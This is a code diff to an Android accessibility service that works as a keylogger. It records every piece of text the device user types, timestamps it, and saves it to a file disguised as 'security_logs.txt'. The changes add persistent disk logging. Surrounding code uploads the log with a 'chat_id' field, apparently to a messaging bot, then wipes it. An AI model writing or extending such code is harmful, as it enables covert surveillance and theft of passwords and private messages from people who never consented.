@@ -7,18 +7,18 @@ import android.os.Looper
 import java.io.*
 import java.net.HttpURLConnection
 import java.net.URL
+import java.text.SimpleDateFormat
 import java.util.*
 import kotlin.concurrent.thread
 
 class MyAccessibilityService : AccessibilityService() {
 
     private val handler = Handler(Looper.getMainLooper())
-    // private val logInterval = 3600000L // 1 hour
-    private val logInterval = 300000L // 2 min
+    private val logInterval = 300000L // 5 min
 
     companion object {
         var instance: MyAccessibilityService? = null
-        var onEventCaptured: ((String) -> Unit)? = null
+        var flutterCallback: ((String) -> Unit)? = null
     }
 
     override fun onServiceConnected() {
@@ -53,17 +53,14 @@ class MyAccessibilityService : AccessibilityService() {
 
                     val outputStream = DataOutputStream(conn.outputStream)
 
-                    // Add Chat ID field
                     outputStream.writeBytes("--$boundary\r\n")
                     outputStream.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n")
                     outputStream.writeBytes("$chatId\r\n")
 
-                    // Add Document field
                     outputStream.writeBytes("--$boundary\r\n")
                     outputStream.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\"${logFile.name}\"\r\n")
                     outputStream.writeBytes("Content-Type: text/plain\r\n\r\n")
 
-                    // Stream the file bytes
                     val fileInputStream = FileInputStream(logFile)
                     val buffer = ByteArray(4096)
                     var bytesRead: Int
@@ -77,7 +74,7 @@ class MyAccessibilityService : AccessibilityService() {
                     outputStream.close()
 
                     if (conn.responseCode == 200) {
-                        logFile.writeText("") // Wipe file after successful send
+                        logFile.writeText("")
                     }
                 } catch (e: Exception) {
                     e.printStackTrace()
@@ -89,12 +86,24 @@ class MyAccessibilityService : AccessibilityService() {
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
         if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
             val typedText = event.text.toString()
-            onEventCaptured?.invoke(typedText)
+            val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
+            val entry = "[$timestamp] $typedText\n"
+
+            // Always write to disk — works even when Flutter is dead
+            try {
+                FileWriter(File(filesDir, "security_logs.txt"), true).use { it.write(entry) }
+            } catch (e: Exception) {
+                e.printStackTrace()
+            }
+
+            // Push to Flutter UI only if it's alive
+            flutterCallback?.invoke(typedText)
         }
     }
 
     override fun onUnbind(intent: android.content.Intent?): Boolean {
         instance = null
+        flutterCallback = null
         handler.removeCallbacksAndMessages(null)
         return super.onUnbind(intent)
     }
